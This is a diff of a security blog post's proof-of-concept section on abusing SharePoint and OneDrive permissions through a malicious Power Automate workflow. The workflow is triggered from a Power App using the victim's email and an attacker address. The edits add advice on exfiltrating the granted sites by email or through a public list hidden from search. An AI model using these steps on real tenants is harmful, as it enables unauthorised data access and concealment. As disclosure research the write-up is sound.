@@ -62,7 +62,10 @@ which expands to the following
 
 ## Proof of Concept
 
-> Note: The site enumeration part of this POC leverages the SharePoint search API and does NOT paginate results. To find all sites, this section should be modified. 
+> Notes: 
+>
+> - The site enumeration part of this POC leverages the SharePoint search API and does NOT paginate results. To find all sites, this section should be modified.
+> - An action can be appended to the end of the workflow to output all sites that you have been granted permissions to, perhaps by `SharePoint | Create Action` in a public SharePoint list (don't forget to disable indexing so it won't be found through SharePoint search), Email `Outlook | Send an Email`, or other similar methods. 
 
 As mentioned above, I have posted a [YouTube POC](https://youtu.be/xXqFhN4wyGY).
 
@@ -72,7 +75,7 @@ My decision to update the attacker parameter in the workflow instead of passing 
 
 ### Steps
 
-1. Create/Import a malicious Power Automate workflow using the template .zip: [POC-M365Phish_20220513055704.zip](/assets/posts/2022/2022-05-13-Abusing-SharePoint-and-OneDrive-Permissions-with-PowerApps-and-Flow/POC-M365Phish_20220513055704.zip) provided
+1. Create/Import a malicious Power Automate workflow using the template .zip: [POC-POC-M365Phish_20220513062553](/assets/posts/2022/2022-05-13-Abusing-SharePoint-and-OneDrive-Permissions-with-PowerApps-and-Flow/POC-POC-M365Phish_20220513062553) provided
 
     Importing may be troublesome and have some errors. The following details may help resolve the issues. If not, then just create a new workflow and manually create each step.
 
@@ -89,7 +92,7 @@ My decision to update the attacker parameter in the workflow instead of passing 
     [![](/assets/posts/2022/2022-05-13-Abusing-SharePoint-and-OneDrive-Permissions-with-PowerApps-and-Flow/2021-10-17-21-23-12.png)](/assets/posts/2022/2022-05-13-Abusing-SharePoint-and-OneDrive-Permissions-with-PowerApps-and-Flow/2021-10-17-21-23-12.png)
 
 
-2. Create a PowerApp that calls the workflow with the following parameters. The parameters for the function are (1) the victim's email, (2) the domain of the tenant (this can be hardcoded, my quick attempt at regex will probably not work in all environments) (3) attacker email (**update this**).
+2. Create a Power App that calls the workflow OnStart with the following parameters. The parameters for the function are (1) the victim's email, (2) the domain of the tenant (this can be hardcoded, my quick attempt at regex will probably not work in all environments) (3) attacker email (**update this**).
 
 ```bash
 'POC-M365Phish'.Run(User().Email, First(MatchAll(User().Email, "(?<=@)[^.]+(?=\.)")).FullMatch, "attacker@domain.onmicrosoft.com")
